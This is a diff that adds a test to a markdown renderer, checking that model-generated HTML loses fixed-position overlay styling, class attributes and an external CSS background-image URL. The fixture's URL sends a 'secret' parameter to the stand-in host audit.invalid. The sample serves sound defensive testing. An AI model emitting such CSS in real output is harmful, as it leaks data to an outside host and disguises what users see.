@@ -93,3 +93,11 @@ describe('extractCodeBlocks', () => {
     expect(blocks[0]!.code).toBe('const a = ');
   });
 });
+
+it('모델 HTML의 외부 리소스 CSS 및 화면 위장 스타일을 제거한다', () => {
+  const html = renderMarkdown('<span class="overlay" style="position:fixed;background-image:url(https://audit.invalid/?secret=value)">본문</span>');
+  expect(html).not.toContain('style=');
+  expect(html).not.toContain('audit.invalid');
+  expect(html).not.toContain('class=');
+  expect(html).toContain('본문');
+});
